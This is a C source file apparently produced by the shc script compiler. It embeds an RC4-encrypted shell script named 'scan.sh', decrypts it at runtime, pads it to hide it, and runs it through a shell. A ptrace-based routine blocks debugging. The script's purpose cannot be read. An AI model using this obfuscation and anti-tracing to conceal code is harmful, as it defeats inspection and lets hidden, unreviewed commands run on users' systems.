#if 0
	shc Version 3.8.7, Generic Script Compiler
	Copyright (c) 1994-2009 Francisco Rosales <frosal@fi.upm.es>

	./shc-3.8.7/shc -f scan.sh 
#endif

static  char data [] = 
#define      chk2_z	19
#define      chk2	((&data[0]))
	"\114\153\305\312\050\046\035\154\250\147\223\127\367\122\074\125"
	"\230\362\235\172\327\112"
#define      pswd_z	256
#define      pswd	((&data[72]))
	"\160\026\322\141\307\015\064\374\275\062\061\144\011\152\114\327"
	"\143\131\373\302\342\215\267\367\103\061\316\215\041\225\247\222"
	"\254\171\363\163\207\047\160\104\131\241\251\143\014\366\073\157"
	"\117\066\234\026\252\210\157\130\160\355\041\034\215\244\203\325"
	"\070\346\065\133\236\351\010\003\163\237\275\263\165\123\073\011"
	"\037\330\037\311\140\217\041\321\175\102\356\012\347\162\340\037"
	"\130\025\173\366\376\203\371\162\042\267\045\230\012\141\242\052"
	"\072\301\363\233\121\025\155\316\127\133\331\076\315\271\136\045"
	"\316\331\034\315\135\026\077\200\315\144\030\330\306\272\002\000"
	"\174\366\234\315\013\011\234\143\144\165\242\062\057\000\130\375"
	"\332\164\312\067\213\012\270\131\157\320\061\065\213\064\066\010"
	"\053\322\326\066\334\162\232\100\350\074\163\027\075\313\025\030"
	"\100\340\120\313\352\010\044\132\331\126\220\144\212\306\155\265"
	"\231\104\354\165\267\206\266\237\302\051\267\000\364\315\030\064"
	"\255\150\377\230\160\044\362\111\172\202\256\005\111\034\273\343"
	"\140\247\130\027\055\016\267\360\067\156\360\054\073\011\140\351"
	"\161\140\201\341\204\164\053\377\367\331\004\101\365\277\044\126"
	"\146\174\155\224\213\044\205\303\223\166\357\317\177\117\271\361"
	"\260\072\322\065\257\376\064\247\327\071\350\315\370\014\043\137"
	"\211\221\062\062\303\351\051\007"
#define      msg1_z	42
#define      msg1	((&data[344]))
	"\074\216\074\316\072\266\302\256\075\351\362\020\147\201\113\363"
	"\266\261\002\343\363\051\107\371\302\245\236\131\303\015\023\237"
	"\166\031\132\165\147\152\062\377\045\065\254\134\043\041\307\206"
	"\007\064\067\230\037\202\103\301\053\246"
#define      text_z	534
#define      text	((&data[409]))
	"\075\161\030\157\243\334\130\315\343\163\305\170\260\124\264\177"
	"\217\327\261\321\264\031\171\352\256\362\204\310\264\247\133\316"
	"\156\055\373\044\045\217\366\224\103\314\172\316\362\250\065\217"
	"\006\314\111\063\135\372\120\220\012\225\130\036\056\045\325\231"
	"\026\043\212\300\311\020\246\106\231\255\276\330\112\365\356\006"
	"\173\273\245\002\064\024\310\024\047\212\202\300\220\131\103\314"
	"\045\056\001\325\117\220\232\371\007\134\016\276\107\127\115\167"
	"\337\325\172\174\206\350\266\234\172\231\210\122\274\004\367\207"
	"\157\100\243\231\242\013\111\105\012\030\111\001\147\012\053\136"
	"\024\064\071\061\271\125\131\350\225\233\347\134\010\247\065\162"
	"\155\121\300\363\031\314\162\174\010\147\166\031\202\223\052\013"
	"\022\172\044\146\202\216\366\263\030\221\311\253\364\144\133\276"
	"\374\322\250\125\162\002\306\007\346\267\351\046\130\016\306\265"
	"\202\043\171\312\116\142\350\077\130\036\142\001\212\356\127\144"
	"\170\156\061\172\016\145\155\156\106\114\224\241\210\124\242\244"
	"\007\150\107\140\227\274\266\217\311\265\161\344\010\346\106\002"
	"\315\025\155\122\164\034\216\141\250\156\005\162\162\330\211\376"
	"\031\244\170\260\331\335\257\204\203\340\224\362\175\003\074\247"
	"\220\213\222\031\054\064\024\304\263\134\317\264\176\232\261\171"
	"\163\111\032\102\355\151\317\350\247\233\155\016\115\116\120\075"
	"\373\124\342\325\250\177\052\331\075\107\006\203\127\035\345\140"
	"\156\045\143\231\104\011\075\006\121\207\151\025\055\365\353\122"
	"\333\350\142\137\012\157\241\057\007\201\137\006\126\326\245\272"
	"\266\057\002\063\251\107\221\264\336\117\141\006\122\116\204\051"
	"\275\142\231\301\101\017\112\141\200\305\024\126\112\262\327\017"
	"\030\322\106\332\046\255\265\211\224\053\357\165\012\120\302\347"
	"\137\221\354\372\242\312\312\305\371\225\010\044\304\213\174\377"
	"\056\046\261\022\066\077\036\073\037\132\341\345\242\277\245\076"
	"\317\055\167\276\017\237\237\204\211\325\364\161\144\232\171\153"
	"\230\001\306\124\177\131\207\112\206\153\235\045\014\262\005\215"
	"\003\267\057\357\035\064\242\341\140\301\036\040\125\231\076\215"
	"\247\254\214\173\027\304\354\304\105\342\035\304\104\137\232\331"
	"\112\147\325\342\242\021\020\046\275\024\074\144\165\364\326\315"
	"\371\057\262\230\002\023\027\053\343\353\024\002\172\202\065\160"
	"\122\154\211\062\237\067\213\153\102\075\250\053\134\053\157\036"
	"\127\025\353\170\367\050\352\020\227\215\355\360\133\320\144\041"
	"\111\025\165\376\225\004\151\327\102\022\003\237\075\162\275\224"
	"\207\250\015\177\321\367\220\151\205\175\132\340\116\276\002\230"
	"\324\167\226\151\174\000\100\276\022\103\135\120\265\032\345\075"
	"\303\363\275\224\353\115\375\160\313\127\121\031\026\123\261\352"
	"\313\110\124\107\111\224\006\133\330\143\254\216\175\222\314\101"
	"\205\211\325\160\327\322\341\243\052\063\275\101\207"
#define      lsto_z	1
#define      lsto	((&data[1061]))
	"\210"
#define      rlax_z	1
#define      rlax	((&data[1062]))
	"\231"
#define      date_z	1
#define      date	((&data[1063]))
	"\015"
#define      xecc_z	15
#define      xecc	((&data[1067]))
	"\011\173\202\047\255\074\007\250\055\266\021\047\125\016\155\023"
	"\030\074"
#define      msg2_z	19
#define      msg2	((&data[1083]))
	"\041\141\224\272\303\255\134\010\262\231\003\355\365\336\227\242"
	"\007\160\141\042\321\230\222"
#define      opts_z	1
#define      opts	((&data[1105]))
	"\243"
#define      inlo_z	3
#define      inlo	((&data[1106]))
	"\262\002\037"
#define      shll_z	10
#define      shll	((&data[1111]))
	"\170\003\206\136\242\360\213\014\377\235\146\012"
#define      tst1_z	22
#define      tst1	((&data[1122]))
	"\035\160\021\322\133\011\261\054\337\344\326\026\375\350\337\011"
	"\152\070\372\071\241\157\003\060\230\276"
#define      chk1_z	22
#define      chk1	((&data[1150]))
	"\226\001\105\017\103\033\172\307\302\234\204\137\001\070\117\156"
	"\217\124\044\306\020\160\362\322\134\062\111\010\123"
#define      tst2_z	19
#define      tst2	((&data[1179]))
	"\304\015\132\246\034\356\222\326\236\335\360\056\211\044\121\124"
	"\057\114\340\110\217\353\021\243\001\033"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		if (text_z < hide_z) {
			/* Prepend spaces til a hide_z script size. */
			scrpt = malloc(hide_z);
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', hide_z);
			memcpy(&scrpt[hide_z - text_z], text, text_z);
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, argv[0]);
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
